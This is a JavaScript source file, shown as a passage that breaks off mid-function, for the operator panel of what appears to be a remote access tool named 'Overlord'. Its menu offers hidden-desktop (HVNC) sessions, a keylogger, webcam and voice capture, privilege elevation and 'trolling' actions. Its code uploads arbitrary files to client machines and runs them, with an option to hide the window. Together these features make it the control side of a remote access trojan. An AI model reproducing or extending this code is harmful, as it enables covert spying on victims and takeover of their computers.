/**
 * side-panel.js â€” Shared side action panel for desktop viewer & remote desktop pages.
 * Version: 1.3.0
 *
 * Usage:
 *   import { initSidePanel } from "./side-panel.js";
 *   initSidePanel(clientId, document.getElementById("sidePanel"));
 */

import { playClickSound, playErrorSound, playSuccessSound } from "./sounds.js";

const SIDE_PANEL_JS_VERSION = "1.8.0";

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Menu definition                                            */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

const PANEL_GROUPS = [
  {
    id: "remote-access",
    label: "Remote Access",
    icon: "fa-solid fa-plug",
    color: "#818cf8",
    items: [
      { label: "Console",          icon: "fa-solid fa-terminal",   color: "#34d399", open: "console" },
      { label: "Backstage (HVNC)", icon: "fa-solid fa-ghost",      color: "#a78bfa", open: "Backstage" },
    ],
  },
  {
    id: "monitoring",
    label: "Monitoring",
    icon: "fa-solid fa-eye",
    color: "#22d3ee",
    items: [
      { label: "Webcam",           icon: "fa-solid fa-video",      color: "#34d399", open: "webcam" },
      { label: "Keylogger",        icon: "fa-solid fa-keyboard",   color: "#facc15", open: "keylogger" },
      { label: "Process Manager",  icon: "fa-solid fa-list-check", color: "#fb923c", open: "processes" },
      { label: "Voice",            icon: "fa-solid fa-headset",    color: "#2dd4bf", open: "voice" },
    ],
  },
  {
    id: "system",
    label: "System",
    icon: "fa-solid fa-server",
    color: "#60a5fa",
    items: [
      { label: "File Browser", icon: "fa-solid fa-folder-tree", color: "#60a5fa", open: "files" },
      { label: "Classic Explorer", icon: "fa-solid fa-folder-open", color: "#fbbf24", open: "files-classic" },
    ],
  },
  {
    id: "trolling",
    label: "Trolling",
    emoji: "\u{1F921}",
    color: "#f472b6",
    items: [
      { label: "Change Wallpaper", icon: "fa-solid fa-image", color: "#c084fc", action: "wallpaper" },
      { label: "Remote Execute", icon: "fa-solid fa-bolt", color: "#f97316", action: "remote-execute" },
      { label: "Open URL", icon: "fa-solid fa-link", color: "#22d3ee", action: "open-url" },
      { label: "Message Box", icon: "fa-solid fa-comment-dots", color: "#fbbf24", action: "message-box" },
      { label: "Big Mouse", icon: "fa-solid fa-arrow-pointer", color: "#4ade80", action: "big-mouse" },
      { label: "Sound Board", icon: "fa-solid fa-music", color: "#f472b6", open: "soundboard-remote" },
    ],
  },
  {
    id: "agent",
    label: "Agent",
    icon: "fa-solid fa-robot",
    color: "#94a3b8",
    items: [
      { label: "Ping",           icon: "fa-solid fa-satellite-dish", color: "#94a3b8", action: "ping" },
      { label: "Reconnect",      icon: "fa-solid fa-rotate",        color: "#94a3b8", action: "reconnect" },
      { label: "Set Nickname",   icon: "fa-solid fa-signature",     color: "#94a3b8", action: "set-nickname" },
      { label: "Elevate",        icon: "fa-solid fa-arrow-up-right-dots", color: "#22c55e", action: "elevate" },
      { divider: true },
      { label: "Disconnect",     icon: "fa-solid fa-plug-circle-xmark", color: "#ef4444", action: "disconnect" },
      { label: "Uninstall",      icon: "fa-solid fa-trash",         color: "#ef4444", action: "uninstall" },
    ],
  },
];

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Open-target â†’ URL mapping                                  */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

function resolveOpenUrl(clientId, target) {
  switch (target) {
    case "console":     return `/${clientId}/console`;
    case "remotedesktop": return `/viewer?clientId=${clientId}&mode=dashboard2`;
    case "webcam":      return `/viewer?clientId=${clientId}&mode=webcam`;
    case "Backstage":   return `/backstage?clientId=${clientId}`;
    case "files":       return `/${clientId}/files`;
    case "files-classic": return `/${clientId}/files/classic`;
    case "processes":   return `/${clientId}/processes`;
    case "keylogger":   return `/${clientId}/keylogger`;
    case "voice":       return `/voice?clientId=${clientId}`;
    case "soundboard-remote": return `/soundboard-remote?clientId=${clientId}`;
    default:            return null;
  }
}

function openFileBrowserWindow(clientId, forceSkin) {
  // Explicit menu targets always open their own UI (never remap via last-used skin).
  const skin = forceSkin === "classic" ? "classic" : "modern";
  if (skin === "classic") {
    try {
      localStorage.setItem("overlord.filebrowser.skin", "classic");
    } catch {}
    window.open(
      `/${clientId}/files/classic`,
      `overlord-fb-classic-${clientId}`,
      "width=780,height=520,menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes",
    );
    return;
  }
  try {
    localStorage.setItem("overlord.filebrowser.skin", "modern");
  } catch {}
  window.open(`/${clientId}/files`, "_blank", "noopener");
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Toast notifications                                        */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

let toastContainer = null;

function ensureToastContainer() {
  if (toastContainer) return;
  toastContainer = document.createElement("div");
  toastContainer.className = "sp-toast-container";
  document.body.appendChild(toastContainer);
}

function showToast(message, type = "info", durationMs = 4000) {
  if (type === "success") playSuccessSound();
  else if (type === "error") playErrorSound();

  ensureToastContainer();
  const toast = document.createElement("div");
  toast.className = `sp-toast sp-toast-${type}`;
  const iconMap = { success: "fa-circle-check", error: "fa-circle-xmark", info: "fa-circle-info" };
  toast.innerHTML = `<i class="fa-solid ${iconMap[type] || iconMap.info}"></i><span></span>`;
  const text = toast.querySelector("span");
  if (text) {
    text.textContent = message;
    if (String(message).includes("\n")) text.style.whiteSpace = "pre-line";
  }
  toastContainer.appendChild(toast);
  requestAnimationFrame(() => toast.classList.add("sp-toast-visible"));
  setTimeout(() => {
    toast.classList.remove("sp-toast-visible");
    toast.addEventListener("transitionend", () => toast.remove(), { once: true });
    setTimeout(() => toast.remove(), 500);
  }, durationMs);
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  REST helpers                                               */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

async function sendCommand(clientId, action, payload) {
  const body = payload ? { action, ...payload } : { action };
  const res = await fetch(`/api/clients/${clientId}/command`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify(body),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(data.error || data.message || `Command failed: ${res.status}`);
  }
  return data;
}

async function patchClient(clientId, field, value) {
  const res = await fetch(`/api/clients/${clientId}/${field}`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify({ value }),
  });
  if (!res.ok) throw new Error(`Patch failed: ${res.status}`);
  return res.json().catch(() => ({}));
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Wallpaper upload                                           */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

const ALLOWED_EXTENSIONS = new Set(["jpg", "jpeg", "png", "bmp"]);
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
const WALLPAPER_POLL_MS = 500;
const REMOTE_EXECUTE_MAX_SIZE = 200 * 1024 * 1024; // 200 MB
const REMOTE_EXECUTE_POLL_MS = 500;
const REMOTE_EXECUTE_TRANSFER_POLL_MS = 200;
const REX_READY_STORAGE_PREFIX = "rex:ready:";

function rexReadyStorageKey(clientId) {
  return `${REX_READY_STORAGE_PREFIX}${clientId}`;
}

function loadRexReadyJob(clientId) {
  try {
    const raw = localStorage.getItem(rexReadyStorageKey(clientId));
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    if (!parsed?.jobId) return null;
    if (parsed.expiresAt && Number(parsed.expiresAt) < Date.now()) {
      localStorage.removeItem(rexReadyStorageKey(clientId));
      return null;
    }
    return parsed;
  } catch {
    return null;
  }
}

function saveRexReadyJob(clientId, job) {
  try {
    localStorage.setItem(
      rexReadyStorageKey(clientId),
      JSON.stringify({
        jobId: job.jobId,
        originalName: job.originalName,
        destinationPath: job.destinationPath,
        expiresAt: job.expiresAt,
        clientVersion: job.clientVersion,
        transferMethod: job.transferMethod,
      }),
    );
  } catch {
    /* ignore quota */
  }
}

function clearRexReadyJob(clientId) {
  try {
    localStorage.removeItem(rexReadyStorageKey(clientId));
  } catch {
    /* ignore */
  }
}

function formatBytes(bytes) {
  const value = Number(bytes) || 0;
  if (value <= 0) return "0 B";
  const units = ["B", "KB", "MB", "GB"];
  let size = value;
  let unit = 0;
  while (size >= 1024 && unit < units.length - 1) {
    size /= 1024;
    unit += 1;
  }
  return `${size >= 10 || unit === 0 ? Math.round(size) : size.toFixed(1)} ${units[unit]}`;
}

function formatSpeed(bytesPerSecond) {
  const value = Number(bytesPerSecond) || 0;
  if (value <= 0) return "0 B/s";
  return `${formatBytes(value)}/s`;
}

function wallpaperPhaseLabel(phase) {
  switch (phase) {
    case "queued": return "Queued";
    case "client_transfer": return "Client transfer";
    case "verify_remote_file": return "Verifying file on client";
    case "apply_wallpaper": return "Applying wallpaper";
    case "succeeded": return "Wallpaper applied";
    case "failed": return "Wallpaper failed";
    default: return "Wallpaper";
  }
}

function wallpaperTransferStateLabel(state) {
  switch (state) {
    case "command_not_sent": return "Command was not sent";
    case "command_sent_no_client_progress": return "Command sent; client did not acknowledge the transfer";
    case "client_transfer_active": return "Client acknowledged the transfer";
    case "client_transfer_complete": return "Client transfer completed";
    default: return "Waiting for client acknowledgement";
  }
}

function wallpaperEndpointSourceLabel(source) {
  switch (source) {
    case "external_config": return "Configured public endpoint";
    case "forwarded_host": return "Reverse-proxy forwarded host";
    case "request_host": return "Request host fallback";
    default: return "Unknown endpoint source";
  }
}

function renderWallpaperDetails(status, file) {
  const transferred = formatBytes(status.bytesTransferred || 0);
  const total = formatBytes(status.totalBytes || file.size || 0);
  const speed = formatSpeed(status.speedBytesPerSecond || 0);
  const destination = status.destinationPath || "unknown destination";
  const endpoint = status.resolvedUrl || status.pullOrigin || "waiting for transfer endpoint";
  const client = String(status.clientId || "unknown").slice(0, 12);
  const version = status.clientVersion ? ` Â· v${status.clientVersion}` : "";
  return `
    <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${transferred} / ${total} Â· ${speed}</div>
    <div class="sp-progress-detail">Client: ${escapeHtml(client)}${escapeHtml(version)} Â· ${escapeHtml(wallpaperTransferStateLabel(status.transferState))}</div>
    <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
    <div class="sp-progress-detail">Endpoint: ${escapeHtml(endpoint)}</div>
  `;
}

function wallpaperErrorText(status) {
  const err = status?.error || {};
  const parts = [
    err.message || status?.message || "Wallpaper change failed",
    err.phase ? `Step: ${wallpaperPhaseLabel(err.phase)}` : "",
    err.transferState || status?.transferState ? `Transfer state: ${wallpaperTransferStateLabel(err.transferState || status.transferState)}` : "",
    err.clientVersion || status?.clientVersion ? `Client version: ${err.clientVersion || status.clientVersion}` : "",
    err.endpointSource || status?.endpointSource ? `Endpoint source: ${wallpaperEndpointSourceLabel(err.endpointSource || status.endpointSource)}` : "",
    `Transferred: ${formatBytes(err.bytesTransferred ?? status?.bytesTransferred ?? 0)} / ${formatBytes(err.totalBytes ?? status?.totalBytes ?? 0)}`,
    err.destinationPath ? `Destination: ${err.destinationPath}` : "",
    err.resolvedUrl || err.pullOrigin ? `Endpoint: ${err.resolvedUrl || err.pullOrigin}` : "",
    err.clientMessage ? `Client: ${err.clientMessage}` : "",
    err.serverMessage ? `Server: ${err.serverMessage}` : "",
  ].filter(Boolean);
  return parts.join("\n");
}

function triggerWallpaperUpload(clientId) {
  const input = document.createElement("input");
  input.type = "file";
  input.accept = ".jpg,.jpeg,.png,.bmp";
  input.style.display = "none";
  document.body.appendChild(input);

  input.addEventListener("change", () => {
    const file = input.files?.[0];
    input.remove();
    if (!file) return;

    const ext = (file.name.split(".").pop() || "").toLowerCase();
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      showToast(`Unsupported format: .${ext} â€” use JPG, PNG, or BMP`, "error");
      return;
    }
    if (file.size > MAX_FILE_SIZE) {
      showToast(`File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is 10 MB.`, "error");
      return;
    }

    uploadWallpaper(clientId, file);
  });

  input.click();
}

function uploadWallpaper(clientId, file) {
  const formData = new FormData();
  formData.append("file", file);

  const xhr = new XMLHttpRequest();

  /* -- progress toast -- */
  ensureToastContainer();
  const progressToast = document.createElement("div");
  progressToast.className = "sp-toast sp-toast-info sp-toast-visible sp-toast-progress";
  progressToast.innerHTML = `
    <i class="fa-solid fa-cloud-arrow-up"></i>
    <span class="sp-progress-label">Preparing wallpaper upload\u2026</span>
    <div class="sp-progress-meta"></div>
    <div class="sp-progress-track"><div class="sp-progress-bar"></div></div>
  `;
  toastContainer.appendChild(progressToast);
  const bar = progressToast.querySelector(".sp-progress-bar");
  const label = progressToast.querySelector(".sp-progress-label");
  const meta = progressToast.querySelector(".sp-progress-meta");

  let pollTimer = null;
  let completed = false;

  const cleanup = () => {
    if (pollTimer) {
      clearTimeout(pollTimer);
      pollTimer = null;
    }
    progressToast.remove();
  };

  xhr.upload.addEventListener("progress", (e) => {
    if (!e.lengthComputable) return;
    const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
    bar.style.width = `${Math.min(45, pct)}%`;
    label.textContent = `Host to server\u2026 ${pct}%`;
    meta.innerHTML = `
      <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
      <div class="sp-progress-detail">Preparing client transfer after staging completes</div>
    `;
  });

  async function pollWallpaperJob(jobId) {
    try {
      const res = await fetch(`/api/clients/${clientId}/wallpaper/${encodeURIComponent(jobId)}`, { credentials: "include" });
      const status = await res.json().catch(() => ({}));
      if (!res.ok) {
        throw new Error(status.message || `Wallpaper status failed: ${res.status}`);
      }

      const pct = status.status === "succeeded" ? 100 : Math.min(99, Math.max(0, Number(status.percent) || 0));
      bar.style.width = `${pct}%`;
      label.textContent = `${wallpaperPhaseLabel(status.phase)}\u2026 ${pct}%`;
      meta.innerHTML = renderWallpaperDetails(status, file);

      if (status.status === "succeeded") {
        completed = true;
        label.textContent = "Wallpaper applied successfully 100%";
        bar.style.width = "100%";
        setTimeout(() => {
          cleanup();
          showToast("Wallpaper changed successfully!", "success");
        }, 600);
        return;
      }

      if (status.status === "failed") {
        completed = true;
        cleanup();
        showToast(wallpaperErrorText(status), "error", 10000);
        return;
      }

      pollTimer = setTimeout(() => pollWallpaperJob(jobId), WALLPAPER_POLL_MS);
    } catch (err) {
      completed = true;
      cleanup();
      showToast(err.message || "Wallpaper status polling failed", "error", 8000);
    }
  }

  xhr.addEventListener("load", () => {
    if (xhr.status >= 200 && xhr.status < 300) {
      try {
        const res = JSON.parse(xhr.responseText);
        if (res.ok && res.jobId) {
          bar.style.width = "0%";
          label.textContent = "Waiting for client transfer\u2026 0%";
          meta.innerHTML = `
            <div class="sp-progress-detail">${escapeHtml(file.name)} Â· ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)}</div>
            <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}</div>
            <div class="sp-progress-detail">Endpoint: ${escapeHtml(res.pullOrigin || "waiting for transfer endpoint")}</div>
          `;
          pollWallpaperJob(res.jobId);
        } else if (res.ok) {
          completed = true;
          cleanup();
          showToast("Wallpaper changed successfully!", "success");
        } else {
          completed = true;
          cleanup();
          showToast(res.message || "Wallpaper change failed", "error", 6000);
        }
      } catch {
        completed = true;
        cleanup();
        showToast("Wallpaper response was not valid JSON", "error", 6000);
      }
    } else {
      let msg = "Upload failed";
      try { msg = JSON.parse(xhr.responseText).message || msg; } catch {}
      completed = true;
      cleanup();
      showToast(msg, "error", 6000);
    }
  });

  xhr.addEventListener("error", () => {
    completed = true;
    cleanup();
    showToast("Network error during upload", "error");
  });

  xhr.addEventListener("abort", () => {
    cleanup();
    if (!completed) showToast("Upload cancelled", "info");
  });

  xhr.open("POST", `/api/clients/${clientId}/wallpaper`);
  xhr.withCredentials = true;
  xhr.send(formData);
}

/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
/*  Remote Execute                                             */
/* â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

function remoteExecutePhaseLabel(phase, status) {
  if (phase === "client_transfer") {
    const state = status?.transferState;
    const clientStatus = status?.lastClientStatus;
    if (clientStatus === "ws_fallback" || status?.transferMethod === "ws_chunks" || status?.usedTransferFallback) {
      return "WebSocket upload fallback";
    }
    if (clientStatus === "retrying") return "Retrying client upload";
    if (clientStatus === "requesting") return "Client requesting file";
    if (clientStatus === "accepted" || clientStatus === "starting") return "Client accepted transfer";
    if (state === "command_sent_no_client_progress" || !status?.clientAcknowledged) {
      return "Waiting for client";
    }
    if ((Number(status?.bytesTransferred) || 0) <= 0) return "Connecting to client";
    return "Uploading to client";
  }
  switch (phase) {
    case "queued": return "Queued";
    case "staging": return "Staging on server";
    case "chmod": return "Setting permissions";
    case "ready": return "Uploaded â€” ready to execute";
    case "execute":
      return status?.usedExecFallback || status?.lastClientStatus === "script_fallback"
        ? "Launching via PowerShell fallback"
        : "Starting process";
    case "succeeded": return "Execution completed";
    case "failed": return "Failed";
    default: return "Remote execute";
  }
}

function remoteExecuteTransferStateLabel(state) {
  switch (state) {
    case "command_not_sent": return "Command was not sent";
    case "command_sent_no_client_progress": return "Waiting for client acknowledgement";
    case "client_transfer_active": return "Client transferring";
    case "client_transfer_complete": return "Client transfer completed";
    default: return "Waiting for client";
  }
}

function remoteExecuteErrorText(status) {
  const err = status?.error || {};
  const parts = [
    err.message || status?.message || "Remote execute failed",
    err.phase || status?.phase ? `Step: ${remoteExecutePhaseLabel(err.phase || status.phase, status)}` : "",
    err.transferState || status?.transferState
      ? `Transfer state: ${remoteExecuteTransferStateLabel(err.transferState || status.transferState)}`
      : "",
    err.clientVersion || status?.clientVersion ? `Client version: ${err.clientVersion || status.clientVersion}` : "",
    err.endpointSource || status?.endpointSource
      ? `Endpoint source: ${wallpaperEndpointSourceLabel(err.endpointSource || status.endpointSource)}`
      : "",
    `Transferred: ${formatBytes(err.bytesTransferred ?? status?.bytesTransferred ?? 0)} / ${formatBytes(err.totalBytes ?? status?.totalBytes ?? 0)}`,
    err.destinationPath || status?.destinationPath ? `Destination: ${err.destinationPath || status.destinationPath}` : "",
    err.resolvedUrl || err.pullOrigin || status?.resolvedUrl || status?.pullOrigin
      ? `Endpoint: ${err.resolvedUrl || status?.resolvedUrl || err.pullOrigin || status?.pullOrigin}`
      : "",
    err.clientMessage ? `Client: ${err.clientMessage}` : "",
    err.serverMessage ? `Server: ${err.serverMessage}` : "",
    err.code ? `Code: ${err.code}` : "",
  ].filter(Boolean);
  return parts.join("\n");
}

function formatRemoteExecuteSpeed(status) {
  const bytes = Number(status?.bytesTransferred) || 0;
  const speed = Number(status?.speedBytesPerSecond) || 0;
  if (bytes <= 0 && speed <= 0) {
    if (status?.lastClientStatus === "retrying") return "retrying";
    if (status?.clientAcknowledged) return "connectingâ€¦";
    return "waitingâ€¦";
  }
  if (speed <= 0) return "â€”";
  return formatSpeed(speed);
}

function renderRemoteExecuteDetails(status, file) {
  const transferred = formatBytes(status.bytesTransferred || 0);
  const total = formatBytes(status.totalBytes || file.size || 0);
  const speed = formatRemoteExecuteSpeed(status);
  const destination = status.destinationPath || "unknown destination";
  const attempt = Number(status.lastClientAttempt) > 0 ? ` Â· attempt ${status.lastClientAttempt}` : "";
  const version = status.clientVersion ? ` Â· agent v${status.clientVersion}` : "";
  const clientMsg = status.lastClientMessage
    ? `<div class="sp-progress-detail">${escapeHtml(status.lastClientMessage)}${escapeHtml(attempt)}</div>`
    : "";
  const method =
    status.transferMethod === "ws_chunks"
      ? "WebSocket chunks"
      : status.transferMethod === "shell_pull"
        ? "Shell download"
        : status.transferMethod === "http_pull"
          ? "HTTP pull"
          : status.usedTransferFallback
            ? "Fallback transfer"
            : "";
  const methodHint = method
    ? `<div class="sp-progress-detail">Transfer: ${escapeHtml(method)}${status.usedTransferFallback ? " (fallback)" : ""}</div>`
    : "";
  const attempts = Array.isArray(status.transferAttempts) && status.transferAttempts.length
    ? `<div class="sp-progress-detail">Attempts: ${escapeHtml(
        status.transferAttempts.map((a) => `${a.method}:${a.ok ? "ok" : a.code || "fail"}`).join(" â†’ "),
      )}</div>`
    : "";
  const waitingHint =
    !status.clientAcknowledged &&
    status.transferState === "command_sent_no_client_progress" &&
    !status.usedTransferFallback
      ? `<div class="sp-progress-detail">No agent progress yet${escapeHtml(version)} â€” trying fallback if available</div>`
      : "";
  return `
    <div class="sp-progress-detail">${escapeHtml(file?.name || status.originalName || "file")} Â· ${transferred} / ${total} Â· ${escapeHtml(speed)}</div>
    <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
    <div class="sp-progress-detail">${escapeHtml(remoteExecuteTransferStateLabel(status.transferState))}${escapeHtml(version)}</div>
    ${methodHint}
    ${attempts}
    ${waitingHint}
    ${clientMsg}
  `;
}

function mountRexPanelHost() {
  const main = document.querySelector(".viewer-main") || document.body;
  let host = main.querySelector(".sp-rex-host");
  if (!host) {
    host = document.createElement("div");
    host.className = "sp-rex-host";
    main.appendChild(host);
  }
  return host;
}

function setRexSegmentProgress(track, percent) {
  if (!track) return;
  const pct = Math.max(0, Math.min(100, Number(percent) || 0));
  const blocks = track.querySelectorAll(".sp-rex-seg");
  const n = blocks.length || 20;
  const filled = Math.round((pct / 100) * n);
  blocks.forEach((el, i) => {
    el.classList.toggle("is-on", i < filled);
  });
  track.setAttribute("aria-valuenow", String(pct));
}

function buildRexSegmentTrackHtml(percent = 0) {
  const segs = Array.from({ length: 20 }, (_, i) => {
    const on = i < Math.round((Math.max(0, Math.min(100, percent)) / 100) * 20);
    return `<span class="sp-rex-seg${on ? " is-on" : ""}"></span>`;
  }).join("");
  return `<div class="sp-rex-win98-track" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="${Math.round(percent)}">${segs}</div>`;
}

function createRemoteExecutePanel(clientId) {
  const ready = loadRexReadyJob(clientId);
  const host = mountRexPanelHost();
  host.querySelectorAll(".sp-rex-panel").forEach((el) => el.remove());

  const panel = document.createElement("div");
  panel.className = "sp-rex-panel";
  panel.setAttribute("role", "dialog");
  panel.setAttribute("aria-modal", "false");
  panel.innerHTML = `
    <div class="sp-rex-chrome">
      <div class="sp-rex-titlebar">
        <span class="sp-rex-title">Remote Execute</span>
        <button type="button" class="sp-rex-close" data-rex-close aria-label="Close">&times;</button>
      </div>
      <div class="sp-rex-body" data-rex-form>
        <label class="sp-field">
          <span>File (any type)</span>
          <input type="file" data-rex-file class="sp-input" />
        </label>
        <label class="sp-field">
          <span>Arguments (optional)</span>
          <input type="text" data-rex-args class="sp-input" placeholder='e.g. --silent "/path with spaces"' />
        </label>
        <label class="sp-field sp-field-check">
          <input type="checkbox" data-rex-hide />
          <span>Hide window (executables/scripts only)</span>
        </label>
        <p class="sp-help">
          <strong>Upload only</strong> stages the file on the client.
          <strong>Upload &amp; Run</strong> transfers and launches immediately.
          <strong>Execute only</strong> runs a previously uploaded ready file.
          Max ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.
        </p>
        <p class="sp-help" data-rex-ready-hint></p>
      </div>
      <div class="sp-rex-body sp-rex-progress" data-rex-progress hidden>
        <div class="sp-rex-progress-label" data-rex-label>Preparing\u2026</div>
        <div class="sp-rex-progress-meta" data-rex-meta></div>
        ${buildRexSegmentTrackHtml(0)}
        <div class="sp-progress-actions" data-rex-actions hidden></div>
      </div>
      <div class="sp-rex-footer" data-rex-footer>
        <button type="button" class="sp-modal-btn sp-modal-btn-cancel" data-rex-close>Cancel</button>
        <button type="button" class="sp-modal-btn" data-rex-action="execute_only" ${ready ? "" : "disabled"}>Execute only</button>
        <button type="button" class="sp-modal-btn" data-rex-action="upload_only">Upload only</button>
        <button type="button" class="sp-modal-btn sp-modal-btn-confirm" data-rex-action="upload_and_run">Upload &amp; Run</button>
      </div>
    </div>
  `;

  const hint = panel.querySelector("[data-rex-ready-hint]");
  if (ready && hint) {
    hint.textContent = `Ready on client: ${ready.originalName || ready.jobId} â†’ ${ready.destinationPath || ""}`;
  } else if (hint) {
    hint.textContent = "No ready upload for this client yet.";
  }

  let busy = false;
  let activeController = null;

  const closePanel = () => {
    if (busy && activeController) {
      void activeController.cancel();
      return;
    }
    panel.remove();
  };

  panel.querySelectorAll("[data-rex-close]").forEach((btn) => {
    btn.addEventListener("click", () => closePanel());
  });

  panel.querySelectorAll("[data-rex-action]").forEach((btn) => {
    btn.addEventListener("click", () => {
      if (btn.disabled || busy) return;
      const action = btn.getAttribute("data-rex-action");
      const fileInput = panel.querySelector("[data-rex-file]");
      const argsInput = panel.querySelector("[data-rex-args]");
      const hideInput = panel.querySelector("[data-rex-hide]");
      const args = String(argsInput?.value || "").trim();
      const hideWindow = !!hideInput?.checked;

      if (action === "execute_only") {
        const readyJob = loadRexReadyJob(clientId);
        if (!readyJob?.jobId) {
          showToast("No ready upload for this client â€” use Upload only first", "error");
          return;
        }
        busy = true;
        panel.classList.add("is-busy");
        activeController = runRemoteExecuteInPanel(panel, clientId, {
          kind: "execute",
          jobId: readyJob.jobId,
          args: args || undefined,
          hideWindow,
          displayName: readyJob.originalName,
          onDone: () => {
            busy = false;
            activeController = null;
            panel.classList.remove("is-busy");
          },
        });
        return;
      }

      const file = fileInput?.files?.[0];
      if (!file) {
        showToast("Select a file to upload", "error");
        return;
      }
      if (file.size <= 0) {
        showToast("File is empty", "error");
        return;
      }
      if (file.size > REMOTE_EXECUTE_MAX_SIZE) {
        showToast(
          `File too large (${(file.size / 1024 / 1024).toFixed(1)} MB). Max is ${REMOTE_EXECUTE_MAX_SIZE / 1024 / 1024} MB.`,
          "error",
        );
        return;
      }

      busy = true;
      panel.classList.add("is-busy");
      activeController = runRemoteExecuteInPanel(panel, clientId, {
        kind: "upload",
        file,
        args: args || undefined,
        hideWindow,
        mode: action === "upload_only" ? "upload_only" : "upload_and_run",
        onDone: () => {
          busy = false;
          activeController = null;
          panel.classList.remove("is-busy");
        },
      });
    });
  });

  host.appendChild(panel);
  panel.querySelector("[data-rex-file]")?.focus();
}

function openRemoteExecuteModal(clientId) {
  createRemoteExecutePanel(clientId);
}

function showRexPanelProgress(panel, { label, percent = 0, metaHtml = "", actionsHtml = "" }) {
  const form = panel.querySelector("[data-rex-form]");
